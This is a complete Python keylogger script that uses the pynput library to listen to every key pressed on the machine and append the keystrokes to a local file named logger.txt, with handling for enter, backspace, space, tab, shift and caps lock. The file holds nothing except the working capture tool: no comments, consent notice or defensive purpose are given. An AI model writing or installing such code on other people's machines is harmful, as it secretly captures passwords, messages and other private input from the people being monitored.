from pynput import keyboard

is_capslock = False

def logkeys(key):
    global is_capslock
    with open('logger.txt','a+') as f:
        log = str(key).strip('\'').lower()
        if key == keyboard.Key.caps_lock:
            if is_capslock == False:
                log = str(key).strip('\'').upper()
            else:
                log = str(key).strip('\'').lower()

        if key == keyboard.Key.enter:
            f.write('\n')
        elif key == keyboard.Key.backspace:
            f.seek(0)
            content = f.read()

            if content:
                content = content[:-1]

            f.seek(0)
            f.truncate()
            f.write(content)

        elif key == keyboard.Key.space:
            f.write(" ")
        elif key == keyboard.Key.enter:
            f.write("\n")
        elif key == keyboard.Key.tab:
            f.write("\t")
        elif key == keyboard.Key.shift or key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            pass
        else:
            f.write(log)
            

with keyboard.Listener(on_press=logkeys) as kl:
    kl.join()
